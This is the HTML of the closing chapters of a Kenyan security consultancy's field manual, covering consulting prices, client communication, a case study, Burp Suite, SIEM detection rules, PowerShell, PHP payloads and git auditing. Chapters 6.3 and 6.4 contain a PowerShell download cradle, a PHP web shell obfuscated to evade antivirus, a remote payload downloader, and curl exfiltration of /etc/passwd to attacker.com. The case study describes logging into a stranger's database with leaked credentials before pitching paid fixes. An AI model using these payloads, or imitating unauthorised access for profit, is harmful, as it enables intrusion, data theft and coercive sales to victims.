                Use a template with a cover page. Use headers. Use a professional font (Inter or Roboto).
                A 5-page PDF with a logo is worth 50,000 KES.
                A WhatsApp message saying "fix your sql injection" is worth 0 KES.</p>
            <hr />
            <p>"Perception is reality. Look expensive, and they will pay you expensive."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 5.5: The 24-Hour Healing Sprint: Pricing and Delivery</h1>
            <hr />
            <h2>The Panic Premium</h2>
            <p>When a specialized team is called in for an emergency, the price is not based on hours. It is based on
                value.
                If a site making 100,000 KES a day is down, getting it up today is worth more than getting it up next
                week.</p>
            <h2>The Pricing Models</h2>
            <h3>1. The Audit (Discovery)</h3>
            <p><strong>Cost</strong>: 10,000 - 30,000 KES
                <strong>Deliverable</strong>: A report detailing the vulnerabilities.
                <strong>Effort</strong>: 2-4 Hours.
                <strong>Strategy</strong>: This is the "Footer in the Door." It is low cost enough for them to say yes
                without a board meeting.
            </p>
            <h3>2. The Healing Sprint (Remediation)</h3>
            <p><strong>Cost</strong>: 50,000 - 150,000 KES
                <strong>Deliverable</strong>: Fixing the code, hardening the server, setting up backups.
                <strong>Effort</strong>: 24-48 Hours.
                <strong>Strategy</strong>: This is the upsell. Once they see the scary report, they will pay you to fix
                it.
            </p>
            <h3>3. The Retainer (Assurance)</h3>
            <p><strong>Cost</strong>: 15,000 KES / Month
                <strong>Deliverable</strong>: Monthly scans, log monitoring, on-call support.
                <strong>Effort</strong>: 2 Hours / Month.
                <strong>Strategy</strong>: Recurring revenue. This is how you build a business.
            </p>
            <h2>Getting Paid</h2>
            <p><strong>Rule 1</strong>: 50% Deposit upfront. No exceptions for new clients.
                <strong>Rule 2</strong>: Do not release the final hardened code until the final 50% is paid.
                <strong>Rule 3</strong>: Use M-Pesa or Bank Transfer. Avoid PayPal (they freeze accounts).
            </p>
            <h2>The Proposal Structure</h2>
            <p>"We propose a <strong>24-Hour Healing Sprint</strong> to neutralize the threat."
                - Phase 1: Lockdown (Immediate blocking of attacker)
                - Phase 2: Patching (Fixing the SQLi/RCE)
                - Phase 3: Hardening (Firewall &amp; Logs)</p>
            <p><strong>Total Cost</strong>: 80,000 KES.
                <strong>Timeline</strong>: 24 Hours from receipt of deposit.
            </p>
            <p>This urgency closes deals.</p>
            <hr />
            <p>"Price based on their pain, not your time."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 5.6: Talking to Mwalimu: Explaining Security to Non-Coders</h1>
            <hr />
            <h2>The Language Barrier</h2>
            <p>The client (whom we affectionately call "Mwalimu" - Teacher/Elder) does not know what SQL Injection is.
                They do not care about XSS.
                They care about:
                1. <strong>Money</strong>: "Will I lose sales?"
                2. <strong>Reputation</strong>: "Will my customers trust me?"
                3. <strong>Liability</strong>: "Will I get sued?"</p>
            <p>You must translate technical risk into business risk.</p>
            <h2>Translation Table</h2>
            <table>
                <thead>
                    <tr>
                        <th style="text-align: left;">Geek Speak</th>
                        <th style="text-align: left;">Mwalimu Speak</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td style="text-align: left;">"Found an unauthenticated RCE via forced browsing."</td>
                        <td style="text-align: left;">"Anyone can control your server without a password."</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">"The database has no encryption on the PII columns."</td>
                        <td style="text-align: left;">"If a hacker gets in, they can read every customer's phone number
                            plainly."</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">"We need to implement a WAF and rate limiting."</td>
                        <td style="text-align: left;">"We need to install a digital guard to stop the bots."</td>
                    </tr>
                    <tr>
                        <td style="text-align: left;">"The SSL certificate uses a weak cipher."</td>
                        <td style="text-align: left;">"Your site lock is broken."</td>
                    </tr>
                </tbody>
            </table>
            <h2>The Fear, Uncertainty, Doubt (FUD) Filter</h2>
            <p>Do not scare them into paralysis.
                <strong>Bad</strong>: "The Russian hackers are coming to destroy you!" (They will think you are scamming
                them).
                <strong>Good</strong>: "Right now, your digital door is unlocked. It's likely nothing has been stolen
                yet, but we should lock it before tonight."
            </p>
            <h2>The "I know a guy" Objection</h2>
            <p>Mwalimu often has a nephew who "knows computers."
                "My nephew built this site. He says it is fine."</p>
            <p><strong>The Counter</strong>:
                "Your nephew is a great builder. But you don't ask the bricklayer to install the bank vault. We are
                security specialists. We work <em>with</em> your nephew to make his work safe."</p>
            <p>Always validate the existing developer. Never insult them. If you make the nephew look bad, Mwalimu will
                defend family. If you make the nephew look like he needs a partner, you get the contract.</p>
            <hr />
            <p>"Respect the client. They built the business you are trying to protect."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 5.7: Case Study: The Playkart 10k Deal</h1>
            <hr />
            <h2>The Deal that Started It All</h2>
            <p>This is the true story of how Marliz Intel made its first 10,000 KES from a Vibe Coded site.</p>
            <h2>The Target</h2>
            <p><strong>Site</strong>: Playkart (Anonymized)
                <strong>Vulnerability</strong>: Exposed <code>.git</code> directory and hardcoded credentials.
            </p>
            <h2>Step 1: Verification (10 Minutes)</h2>
            <p>We downloaded the source code via <code>git-dumper</code>. We found the <code>config.php</code> file with
                the database password. We logged into the database to verify the credentials worked. We took <strong>one
                    screenshot</strong> of the <code>admin</code> table (redacted).
                We did not change anything.</p>
            <h2>Step 2: The Contact (Day 1, 14:00)</h2>
            <p>We found the owner's phone number on the Facebook page.
                We sent a WhatsApp message (Business Account).
                "Hello. We are Marliz Intel. We have identified a critical data leak in your platform that exposes
                customer information. We are sharing this as a courtesy. Please find the attached evidence."
                <strong>Attachment</strong>: The redacted screenshot.
            </p>
            <h2>Step 3: The Panic (Day 1, 14:05)</h2>
            <p>The owner called immediately.
                "Who are you? Did you hack me?"
                <strong>Response</strong>: "We are security analysts. We found the door open. We did not enter, but we
                took a picture of the lock to show you it is broken."
            </p>
            <h2>Step 4: The Negotiation (Day 1, 14:15)</h2>
            <p>Owner: "Can you fix it?"
                Marliz: "Yes. We can secure the server, remove the leaked files, and rotate your passwords."
                Owner: "How much?"
                Marliz: "For a standard emergency patch, we charge 15,000 KES."
                Owner: "I can do 10,000 KES right now."
                Marliz: "Deal. 5k deposit now. 5k after completion."</p>
            <h2>Step 5: The Execution (Day 1, 15:00)</h2>
            <p>Deposit received (M-Pesa).
                We deleted the <code>.git</code> folder. We changed the DB password. We added a <code>.htaccess</code>
                file to block directory listing.
                Time taken: 20 minutes.</p>
            <h2>Step 6: The Deliverable (Day 1, 15:30)</h2>
            <p>We sent a 1-page PDF showing "Before" and "After" screenshots.
                The owner paid the balance.</p>
            <h2>The Lesson</h2>
            <p>We made 10,000 KES in 30 minutes of actual work.
                The client was happy because they felt safe.
                We were happy because we got paid.
                The malicious hackers were unhappy because the target was closed.</p>
            <p>Everyone wins. except the bad guys.</p>
            <hr />
            <p>"Opportunity looks a lot like hard work."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <h1 style="margin-top:100px;">PART 6 TOOLS OF THE TRADE</h1>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 6.1: Burp Suite Essentials</h1>
            <hr />
            <h2>The Surgeon's Scalpel</h2>
            <p>If you are attacking a web application using only a browser, you are fighting with one hand tied behind
                your back.
                Browsers hide things. They render HTML. They execute JavaScript. They manage cookies.</p>
            <p>To see the truth, you need <strong>Burp Suite</strong>.</p>
            <p>Burp Suite is a proxy. It sits between your browser and the server. Every request hangs in the air,
                waiting for your permission to proceed. You can edit the data <em>after</em> it leaves the browser but
                <em>before</em> it hits the server.
            </p>
            <h2>Installation</h2>
            <ol>
                <li>Download Burp Suite Community Edition (Free).</li>
                <li>Configure your browser (Firefox is best) to proxy traffic to <code>127.0.0.1:8080</code>.</li>
                <li>Install the Burp CA Certificate so you can intercept HTTPS traffic.</li>
            </ol>
            <h2>Key Modules</h2>
            <h3>1. Proxy (Intercept)</h3>
            <p>This is the core.
                <strong>Scenario</strong>: The website has a dropdown menu for "User Role" that is disabled.
                <strong>Attack</strong>:
                - Submit the form.
                - Catch the request in Burp.
                - See <code>role=user</code>.
                - Change it to <code>role=admin</code>.
                - Forward the request.
                - The server receives <code>role=admin</code>. The frontend validation is bypassed.
            </p>
            <h3>2. Repeater</h3>
            <p>This is for manual testing.
                <strong>Scenario</strong>: You suspect SQL Injection on a search bar.
                <strong>Action</strong>:
                - Send the search request to Repeater.
                - Change <code>search=shoes</code> to <code>search=shoes'</code>.
                - Click Send.
                - Check response.
                - Change to <code>search=shoes'--</code>.
                - Click Send.
                You can fire 100 variations in a minute without reloading the page.
            </p>
            <h3>3. Intruder (Rate Limited in Free Version)</h3>
            <p>This is for brute force.
                <strong>Scenario</strong>: You want to guess the admin password.
                <strong>Action</strong>:
                - send login request to Intruder.
                - Highlight the password field.
                - Load a wordlist.
                - Burp sends 1000 requests, swapping the password each time.
            </p>
            <h2>The Marliz Workflow</h2>
            <ol>
                <li>Open Browser.</li>
                <li>Turn on Burp Intercept.</li>
                <li>Click every button on the target site.</li>
                <li>"Map the Application" in Burp's history tab.</li>
                <li>Send interesting requests to Repeater.</li>
                <li>Break things.</li>
            </ol>
            <hr />
            <p>"The browser lies. The proxy tells the truth."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 6.2: SIEM - The Art of Correlation</h1>
            <hr />
            <h2>The Brain of the SOC</h2>
            <p>A SIEM (Security Information and Event Management) system is often treated as a compliance dump - a place
                where logs go to die. This is a waste of a million-dollar tool.</p>
            <p>The SIEM is the brain of your security operation. It remembers everything. But like any brain, it is
                useless if you don't teach it <em>how to think</em>.</p>
            <p>This chapter assumes you have the logs. Now we will teach you <strong>Detection Engineering</strong>: the
                art of turning raw data into actionable intelligence.</p>
            <h2>The Problem: "Log Fatigue"</h2>
            <p>A single domain controller generates 50,000 logs an hour. A firewall generates millions.</p>
            <p>If your strategy is "Alert me on every failed login," you will fail. You will receive 5,000 emails a day,
                ignore them all, and miss the real breach. This is <strong>Alert Fatigue</strong>.</p>
            <p><strong>The Solution:</strong> We do not alert on <em>events</em>. We alert on <em>patterns</em>.</p>
            <h2>The Formula for Correlation</h2>
            <p>Correlation is the logic of combining multiple weak signals to create one high-fidelity alert.</p>
            <p><strong>Logic:</strong><br>
                <code>Condition A</code> + <code>Condition B</code> + <code>Time constraints</code> =
                <strong>Incident</strong>
            </p>
            <h3>Tier 1: The "Noise" (Do Not Alert)</h3>
            <ul>
                <li><strong>Event:</strong> <code>EventID 4625</code> (Failed Login).</li>
                <li><strong>Context:</strong> User creates a typo.</li>
                <li><strong>Action:</strong> Log it. Do not page the analyst.</li>
            </ul>
            <h3>Tier 2: The Brute Force (Simple Correlation)</h3>
            <ul>
                <li><strong>Logic:</strong>
                    <ul>
                        <li><code>EventID 4625</code> (Failed Login)</li>
                        <li><code>Count</code> &gt; 10</li>
                        <li><code>Source_IP</code> = Same</li>
                        <li><code>Timeframe</code> = 1 minute</li>
                    </ul>
                </li>
                <li><strong>Verdict:</strong> This is a script.</li>
                <li><strong>Action:</strong> Low severity ticket.</li>
            </ul>
            <h3>Tier 3: The "Impossible Travel" (High Fidelity)</h3>
            <p>This is where you start nodding your head. This rule catches compromised credentials even when the
                password is correct.</p>
            <ul>
                <li><strong>Logic:</strong>
                    <ul>
                        <li><code>Event A</code>: Successful Login (<code>User: jdoe</code>) from
                            <code>IP: 1.2.3.4 (New York)</code> at <code>10:00 AM</code>.
                        </li>
                        <li><code>Event B</code>: Successful Login (<code>User: jdoe</code>) from
                            <code>IP: 5.6.7.8 (London)</code> at <code>11:00 AM</code>.
                        </li>
                        <li><code>Constraint</code>: Time difference &lt; 6 hours (Flight time).</li>
                    </ul>
                </li>
                <li><strong>Verdict:</strong> Physics violation. <code>jdoe</code> did not fly supersonic. His
                    credentials are stolen and being used by two people.</li>
                <li><strong>Action:</strong> <strong>Critical Alert.</strong> Isolate account immediately.</li>
            </ul>
            <h3>Tier 4: The "Low & Slow" Exfiltration (The Marliz Standard)</h3>
            <p>Advanced attackers don't smash windows; they sneak. They use "Low and Slow" techniques to stay under the
                radar. Here is how we catch them.</p>
            <ul>
                <li><strong>The Scenario:</strong> An attacker is stealing your database, but in small chunks to avoid
                    spiking the bandwidth graph.</li>
                <li><strong>The Query Logic:</strong>
                    <ol>
                        <li><strong>Select</strong>: Firewall Allow Logs.</li>
                        <li><strong>Filter</strong>: <code>Direction = Outbound</code> AND
                            <code>Destination_Port != 80/443</code>.
                        </li>
                        <li><strong>Aggregation</strong>: Sum(<code>Bytes_Sent</code>) per <code>Source_IP</code> &gt;
                            500MB over <code>24 hours</code>.</li>
                        <li><strong>Enrichment</strong>: <code>Destination_IP</code> is NOT in
                            <code>Known_Business_Partners</code>.
                        </li>
                        <li><strong>Context</strong>: Occurs between <code>02:00</code> and <code>05:00</code> (User's
                            local time).</li>
                    </ol>
                </li>
                <li><strong>Verdict:</strong> Why is a laptop sending 500MB of data to an unknown IP in Russia at 3 AM
                    on a non-web port?</li>
                <li><strong>Action:</strong> Wake up the CISO.</li>
            </ul>
            <h2>The "Trap" Integration</h2>
            <p>Recall <strong>Chapter 3.6</strong>. We discussed setting a trap for Path Traversal.</p>
            <p>Real detection engineering connects the <strong>App</strong> to the <strong>Firewall</strong> via the
                <strong>SIEM</strong>.
            </p>
            <ol>
                <li><strong>Trigger:</strong> Web Server logs <code>GET /../../etc/passwd</code>.</li>
                <li><strong>SIEM Rule:</strong> <code>IF URI contains "../" THEN Trigger "Web Attack"</code>.</li>
                <li><strong>SOAR Response:</strong> <code>Update Firewall Group -&gt; Block Source_IP for 24h</code>.
                </li>
            </ol>
            <p>The analyst doesn't even need to wake up. The system defended itself.</p>
            <hr />
            <p>"A single log is data. Two logs connected by logic is intelligence."<br>
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 6.3: PowerShell for Hackers</h1>
            <hr />
            <h2>Living off the Land</h2>
            <p>If you compromise a Windows Server, you do not need to download tools. You have
                <strong>PowerShell</strong>.
                It is installed by default, trusted by the OS, and incredibly powerful.
            </p>
            <h2>The Download Cradle</h2>
            <p>You need to download your payload, but there is no <code>wget</code> or <code>curl</code> on older
                Windows boxes.</p>
            <p><strong>The Command:</strong></p>
            <pre><code class="language-powershell">IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
</code></pre>
            <p><code>IEX</code> (Invoke-Expression) runs the script immediately in memory. It never touches the disk.
                Antivirus often misses this.</p>
            <h2>Network Recon</h2>
            <p>You want to scan the internal network but can't install Nmap.</p>
            <p><strong>The Loop:</strong></p>
            <pre><code class="language-powershell">1..255 | % {echo &quot;192.168.1.$_&quot;; Test-Connection -Count 1 -ComputerName 192.168.1.$_ -Quiet}
</code></pre>
            <p>This is a "Ping Sweep" written in one line of native code.</p>
            <h2>File Hunting</h2>
            <p>You are looking for passwords.</p>
            <pre><code class="language-powershell">Get-ChildItem -Path C:\Users -Include *.txt,*.config,*.xml -Recurse | Select-String -Pattern &quot;password&quot;
</code></pre>
            <p>This searches every user folder recursively for typical config files containing the string "password".
            </p>
            <h2>Execution Policy Bypass</h2>
            <p>If the server says "Scripts disabled," just ignore it.</p>
            <pre><code class="language-powershell">powershell -ExecutionPolicy Bypass -File script.ps1
</code></pre>
            <p>PowerShell is not just a shell. It is the administration framework. If you control it, you control the
                machine.</p>
            <hr />
            <p>" Bash is for Linux. PowerShell is for Empires."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 6.4: Writing Custom PHP Payloads</h1>
            <hr />
            <h2>Why Custom?</h2>
            <p>Standard webshells (like c99 or r57) are detected by every antivirus on the planet. If you upload them,
                they are deleted instantly.</p>
            <p>To survive, you must write your own. It does not need to be complex. It just needs to be unique.</p>
            <h2>The Minimalist Web Shell</h2>
            <p><strong>Code:</strong></p>
            <pre><code class="language-php">&lt;?php system($_GET['c']); ?&gt;
</code></pre>
            <p><strong>Obfuscation:</strong>
                Antivirus scans for <code>system(</code>. So we hide it.</p>
            <pre><code class="language-php">&lt;?php
$a = &quot;sys&quot;;
$b = &quot;tem&quot;;
$cmd = $a . $b;
$cmd($_GET['c']);
?&gt;
</code></pre>
            <p>Now, the static signature analyzer sees string concatenation, not a system call. But PHP executes it just
                the same.</p>
            <h2>The Uploader</h2>
            <p>Sometimes you have command injection (RCE) but no file upload form. You can build one.</p>
            <pre><code class="language-php">&lt;?php
file_put_contents(&quot;shell.php&quot;, fopen(&quot;http://attacker.com/shell.txt&quot;, 'r'));
?&gt;
</code></pre>
            <p>This script reaches out to effectively <em>download</em> your malware from your server and save it
                locally.</p>
            <h2>The Information Leaker</h2>
            <p>If you only have Blind RCE (you can run commands but see no output), use <code>curl</code> to send the
                data to yourself.</p>
            <pre><code class="language-bash">cat /etc/passwd | curl -d @- http://attacker.com/
</code></pre>
            <p>This sends the content of the password file as a POST request to your listening server.</p>
            <hr />
            <p>"Simplicity evades detection."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 6.5: Git for Security Audits</h1>
            <hr />
            <h2>The Time Machine</h2>
            <p>Git is not just for version control. It is a forensic tool.
                When we audit a codebase, we use git to answer: "Who broke it?" and "When?"</p>
            <h2>Git Dumper</h2>
            <p>If we find an exposed <code>.git</code> directory on a live server, we use <code>git-dumper</code>.</p>
            <pre><code class="language-bash">git-dumper http://target.com/.git/ output_directory
</code></pre>
            <p>This reconstructs the entire project locally.</p>
            <h2>Hunting Secrets in History</h2>
            <p>Developers often commit a password, realize the mistake, delete it, and commit again.
                The password is still in the history.</p>
            <p><strong>Log Search:</strong></p>
            <pre><code class="language-bash">git log -p | grep &quot;password&quot;
</code></pre>
            <p>This shows every change ever made to a line containing "password."</p>
            <p><strong>TruffleHog:</strong>
                We use a tool called <strong>TruffleHog</strong> to scour the entire commit history for high-entropy
                strings (AWS keys, private keys).</p>
            <h2>Blame Game</h2>
            <p>Who wrote the vulnerable code?</p>
            <pre><code class="language-bash">git blame index.php
</code></pre>
            <p>Line 42: <code>Author: John Doe</code>.
                This helps in the "Root Cause Analysis" phase of the DFIR report. It is not about shaming John. It is
                about understanding that John needs training on Input Validation.</p>
            <hr />
            <p>"The past is never deleted. It is just committed."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 6.6: MySQL Workbench for Reconnaissance</h1>
            <hr />
            <h2>Not Just for DBAs</h2>
            <p>We have discussed using MySQL Workbench for exploitation (Chapter 2.5), but it is also a powerful
                <strong>Reconnaissance</strong> tool.
            </p>
            <h2>The Connection Test</h2>
            <p>When you are scanning a range of IPs (e.g., a subnet belonging to a company), you can use Workbench to
                test for open doors without needing complex command-line scanners.</p>
            <ol>
                <li><strong>New Connection</strong>.</li>
                <li><strong>Hostname</strong>: Target IP.</li>
                <li><strong>Port</strong>: 3306.</li>
                <li><strong>Username</strong>: <code>root</code> (or <code>admin</code>, <code>backup</code>).</li>
                <li><strong>Test Connection</strong>.</li>
            </ol>
            <p>If the server responds:<br>
                &gt; "Access Denied for user 'root' used password NO"</p>
            <p>You know three critical facts:
                1. <strong>The port is open</strong> (you bypassed the firewall).
                2. <strong>MySQL is running</strong> on that server.
                3. <strong>The root user exists</strong> (username enumeration).</p>
            <p>This is valuable information leakage.</p>
            <h2>Visualizing the Loot</h2>
            <p>If you manage to steal credentials (e.g., from a <code>config.php</code> file), using the command line
                <code>mysql -u root -p</code> is tedious and hard to read.
            </p>
            <p>Workbench allows you to:
                1. <strong>Reverse Engineer</strong>: Click "Database" -&gt; "Reverse Engineer" to generate a full
                <strong>Entity Relationship Diagram (ERD)</strong>. You can see how the tables link, helping you find
                the "Crown Jewels" (User tables, Transaction tables) instantly.
                2. <strong>Export Data</strong>: Right-click a table -&gt; "Export Table Data" -&gt; CSV. This is how
                you generate Proof of Concept (PoC) artifacts for your report efficiently.
            </p>
            <h2>The Tunnel (Bypassing Firewalls)</h2>
            <p>Workbench has built-in SSH Tunneling, which is a common hacker technique made easy.</p>
            <p><strong>Scenario:</strong> The database port (3306) is blocked by a firewall, but SSH (22) is open. You
                have compromised a user (e.g., `git` or `www-data` via SSH key theft).</p>
            <p><strong>The Setup:</strong>
                1. <strong>Connection Method</strong>: Standard TCP/IP over SSH.
                2. <strong>SSH Host</strong>: Target IP (The web server).
                3. <strong>SSH User</strong>: <code>www-data</code> (The compromised user).
                4. <strong>MYSQL Host</strong>: <code>127.0.0.1</code> (Internal to the server).</p>
            <p><strong>Result:</strong> You are now managing the "internal-only" database from your remote laptop,
                tunneling your traffic through the SSH connection. The firewall sees only encrypted SSH traffic.</p>
            <hr />
            <p>"A GUI is not a sign of weakness. It is a tool for speed."<br>
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <!-- PAGE: BACK COVER -->
    <div class="page back-cover">
        <!-- Corner elements -->
        <div class="corner corner-tl"></div>
        <div class="corner corner-tr"></div>
        <div class="corner corner-bl"></div>
        <div class="corner corner-br"></div>

        <!-- Edition info -->
        <div class="edition-info">FIRST EDITION • FEBRUARY 2026</div>

        <!-- Main content -->
        <div class="content-box">
            <!-- War Journal quote -->
            <div class="quote-box-wrap">
                <div class="quote-text">
                    "This is not a textbook.<br>This is a war journal."
                </div>
                <div class="quote-author"> - FROM THE INTRODUCTION</div>
            </div>

            <div class="divider"></div>

            <!-- Description -->
            <div class="description-box">
                <p class="description-p">
                    Every chapter in this manual is based on <strong>real attacks, real defenses, and real
                        money</strong> made from the cybersecurity trenches. We show you what happens when a live
                    adversary is scanning your server at 3 AM, and you have 10 minutes to stop them.
                </p>
                <p class="description-p">
                    Born from Kenya's digital frontlines, this field manual documents actual incidents and defense
                    strategies that turned security skills into consulting income.
                </p>
            </div>

            <!-- What's Inside -->
            <div class="inside-box">
                <div class="inside-title">WHAT'S INSIDE:</div>
                <ul>
                    <li>The Vibe Coding Epidemic and AI-generated vulnerabilities</li>
                    <li>Offensive Security: Real attack chains from recon to hijacking</li>
                    <li>Defensive Security: 10-minute patches and honeypot deployment</li>
                    <li>Incident Response: The OODA loop during live attacks</li>
                </ul>
            </div>

            <!-- Author section -->
            <div class="author-box">
                <div class="author-label">ABOUT THE AUTHORS</div>
                <div class="author-name">JOHN MARK OGUTA & THE MARLIZ INTEL TEAM</div>
                <div class="author-bio">
                    John Mark Oguta leads Marliz Intel, a cybersecurity team operating from Nairobi, Kenya. The team
                    specializes in offensive security, incident response, and security consulting.
                </div>
            </div>

            <!-- Bottom section -->
            <div class="footer-row">
                <div class="web-info">
                    <div class="web-label">LEARN MORE AT:</div>
                    <div class="web-url">MARLIZINTEL.COM</div>
                </div>

                <div class="qr-box">
                    <div class="qr-placeholder">
                        Marliz<br>Intel<br>
                    </div>
                    <div class="qr-label">Intel Bureau</div>
                </div>
            </div>
        </div>

        <!-- Kenyan flag accent -->
        <div class="flag-accent"></div>
    </div>
</body>

</html>